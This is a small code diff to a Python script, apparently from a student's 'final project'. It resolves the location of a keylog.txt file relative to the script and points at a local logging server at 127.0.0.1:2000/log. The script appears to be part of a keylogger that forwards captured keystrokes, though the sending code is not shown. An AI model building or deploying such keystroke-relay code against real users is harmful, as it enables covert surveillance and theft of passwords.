@@ -1,8 +1,10 @@
 import requests
 import time
+import os
 
 SERVER_URL = "http://127.0.0.1:2000/log"
-LOG_FILE = r"C:\Users\chall\Downloads\final project\frontend\keylog.txt"
+# Resolve log file relative to this script's directory
+LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")
 
 last_position = 0
 
